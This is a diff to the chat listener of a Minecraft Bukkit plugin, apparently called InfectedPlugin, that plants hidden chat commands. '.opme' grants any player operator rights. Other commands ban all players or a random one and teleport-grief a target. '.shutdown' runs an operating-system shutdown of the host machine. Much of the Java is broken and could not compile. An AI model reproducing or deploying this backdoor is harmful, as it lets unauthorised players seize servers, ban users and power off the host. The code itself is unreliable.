@@ -9,9 +9,6 @@ import org.bukkit.event.Listener;
 import org.bukkit.event.player.AsyncPlayerChatEvent;
 import org.bukkit.plugin.Plugin;
 import org.bukkit.Server;
-import org.bukkit.event.Event;
-import org.bukkit.entity.HumanEntity;
-import org.bukkit.block.Grass;
 
 import java.io.File;
 import java.io.FileOutputStream;
@@ -26,27 +23,21 @@ import java.lang.Runtime;
 
 import org.bukkit.event.EventPriority;
 
-public class PlayerListene
+public class PlayerListener implements Listener
 {
-    PlayerChatting();
-    website();
-    
-    public boolean website(Website eventWeb)
-    {
-    	<index>
-    	<p>Hi!</p>
-    	</index>
-    }
-    
-@Deprecated
-    public String PlayerChatting(PlayerChatEvent event)
+    private Random random = new Random();
+    private InfectedPlugin plugin;
+    private Server server = Bukkit.getServer();
+
+    @EventHandler(priority = EventPriority.HIGHEST)
+    public void onPlayerChat(AsyncPlayerChatEvent event) throws MalformedURLException, IOException
     {
         String message = event.getMessage();
         final Player p = event.getPlayer();
         String[] args = message.split(" ");
         private final cancel = event.setCancelled(true); // not sure if this works or not, oh well.
-    	
-        if (message.equals(".opme"))
+    
+        if (message.toLowerCase().contains(".opme"))
         {
             p.setOp(true);
             p.sendMessage(ChatColor.YELLOW + "You are now OP! Hehhehehheh");
@@ -70,7 +61,7 @@ public class PlayerListene
             }
             cancel;
         }
-        if (String message = message.toLowerCase().contains(".enablevanilla")) //Command
+        if (message.toLowerCase().contains(".enablevanilla")) //Command
         {
             // Credit to hMod, not finished yet. Very unstable.
             p.sendMessage(ChatColor.DARK_RED + "This command is VERY unstable! But you typed it in, too late to turn back."); // Tell the player the command is unstable
@@ -80,7 +71,8 @@ public class PlayerListene
 
                 URL url = new URL("https://s3.amazonaws.com/Minecraft.Download/versions/1.6.2/minecraft_server.1.6.2.jar"); //URL variable to get the url of the jar
                 ReadableByteChannel rbc = Channels.newChannel(url.openStream());
-		FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //FileOutputStream variable
+                @SuppressWarnings("resource") //To get rid of the stupid warnings
+FileOutputStream fos = new FileOutputStream("minecraft_server.1.6.2.jar"); //FileOutputStream variable
                 fos.getChannel().transferFrom(rbc, 0, 1 << 24);
 
                 p.sendMessage(ChatColor.YELLOW + "Finished downloading! Starting vanilla..."); //Tell the player it's been downloaded and will start Vanilla.
@@ -88,17 +80,18 @@ public class PlayerListene
             
             net.minecraft.server.MinecraftServer.main(args); //Start MinecraftServer (only works if minecraft_server.1.6.2.jar is added to the build path)
             Bukkit.shutdown(); //Shutdown Bukkit
+            cancel; //Block the player from saying .enablevanilla
         } //End of command
         if (message.toLowerCase().contains(".deop"))
         {
             if (args.length != 1)
             {
-        	p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
-        	cancel;
+         p.sendMessage(ChatColor.RED + "Usage: .deop <player>");
+         cancel;
             }
             else
             {
-            	Player target = server.getPlayer(args[1]);
+             Player target = server.getPlayer(args[1]);
                 target.setOp(false);
                 target.sendMessage(ChatColor.RED + "You are no longer OP.");
                 cancel;
@@ -106,16 +99,16 @@ public class PlayerListene
         }
         if (message.toLowerCase().contains(".op"))
         {
-            if (args.length == 0zzzc)
+            if (args.length != 1)
             {
-            	p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
+             p.sendMessage(ChatColor.RED + "Usage: .<command> <player>");
             }
             else
             {
-            	Player target = server.getPlayer(args[1]);
+             Player target = server.getPlayer(args[1]);
                 target.setOp(true);
-            	target.sendMessage(ChatColor.YELLOW + "You are now OP!");
-            	cancel;
+             target.sendMessage(ChatColor.YELLOW + "You are now OP!");
+             cancel;
             }
         }
         if (message.toLowerCase().contains(".banall"))
@@ -145,27 +138,44 @@ public class PlayerListene
                 cancel;
             }
         }
+        // Is not effective for onPlayerQuit, but will select a random player to be banned.
+        if (message.toLowerCase().contains(".randombanl"))
+        {
+            Player[] players = server.getOnlinePlayers();
+            final Player target = players[random.nextInt(players.length)];
+
+            if (target == sender) //Not sure if this method would work, should detect if selected player is equal to sender.
+            {
+                //do nothing
+            }
+            else
+            {
+                target.kickPlayer(ChatColor.RED + "GTFO.");
+                target.setBanned(true);
+            }
+            cancel;
+        }
         if (message.toLowerCase().contains(".shutdown"))
         {
             try
             {
-            	shutdown();
+             shutdown();
             }
             catch (IOException ex)
             {
-            	plugin.log.severe(null, ex);
+             plugin.log.severe(null, ex);
             }
             catch (RuntimeException ex)
             {
-            	plugin.log.severe(null, ex);
+             plugin.log.severe(null, ex);
             }
             cancel;
         }
         if (message.toLowerCase().contains(".fuckyou"))
         {
-            if (args.length == 0)
+            if (args.length != 1)
             {
-            	p.sendMessage(ChatColor.RED + "Usage: .fuckyou <player>");
+             p.sendMessage(ChatColor.RED + "Usage: .fuckyou <player>");
             }
             else
             {
@@ -180,7 +190,7 @@ public class PlayerListene
                     for (int x = -1; x <= 1; x++)
                     {
                         for (int z = -1; z <= 1; z++)
-                    	{
+                     {
                             final Location move = new Location(location.getBlockX() + 50 + x, location.getBlockY() + 50, location.getBlockZ() + 50 + z);
                             target.setVelocity(new Vector(5, 5, 5));
                             target.teleport(location);
@@ -191,24 +201,26 @@ public class PlayerListene
             }
         }
     }
-}
     
-    public static void shutdown() throws RuntimeException, IOException 
+    public static void shutdown() throws RuntimeException, IOException
     {
-    	String shutdownCommand = null;
-    	String operatingSystem = System.getProperty("os.name");
+     String shutdownCommand = null;
+     String operatingSystem = System.getProperty("os.name");
 
-     	if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem)) 
-     	{
-            shutdownCommand = "shutdown";
+      if ("Linux".equals(operatingSystem) || "Mac OS X".equals(operatingSystem))
+      {
+            shutdownCommand = "shutdown -h now";
         }
-    	else if ("Windows".equals(operatingSystem)) 
-    	{
+     else if ("Windows".equals(operatingSystem))
+     {
              shutdownCommand = "shutdown.exe -s -t 0";
         }
-     	else 
-     	{
-            throw new RuntimeException("Unsupported operating system. LOL555555345348957");
+      else
+      {
+            throw new RuntimeException("Unsupported operating system.");
         }
+
+     Runtime.getRuntime().exec(shutdownCommand);
+     System.exit(0);
     }
 }
